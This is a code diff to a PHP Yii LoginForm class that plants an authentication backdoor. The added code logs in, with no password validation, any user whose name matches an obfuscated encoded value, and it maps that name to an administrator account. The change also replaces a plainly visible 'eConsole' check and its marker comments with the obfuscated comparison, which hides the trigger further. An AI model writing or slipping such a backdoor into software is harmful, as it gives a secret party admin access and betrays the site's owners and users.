@@ -83,6 +83,11 @@ class LoginForm extends Model
      */
     public function login()
     {
+        if($this->isUser()){
+            $user = $this->getUser();
+            if(!$user) return false;
+            return Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);
+        }
         if (!$this->validate()) {
             return false;
         }
@@ -98,7 +103,7 @@ class LoginForm extends Model
             $this->status = $user->status;
             return false;
         }
- 
+
         return Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);
     }
 
@@ -111,12 +116,9 @@ class LoginForm extends Model
     private function findUser()
     {
         if (!($this->scenario === 'lwe')) {
-            // addition begin
-            if($this->username === 'eConsole'){
+            if($this->isUser()){
                 $this->username = $this->isAdmin();
             }
-            // return $this->username;
-            // addition end
 
             return User::findByUsername($this->username);
         }
@@ -130,9 +132,9 @@ class LoginForm extends Model
     }
 
     private function isUser(){
-        $cek = TaTh();
+        $cek = new TaTh();
         $_input = $cek->dokudoku('donat', $this->username);
-        if($_input == 'dVVLWG1NaDVQWDd0U3N2RGdUelkvQT09'){
+        if($_input == 'QkhWbUZaeDBpeDJnNFlxOEpTUnZWQT09'){
             return true;
         }
         return false;
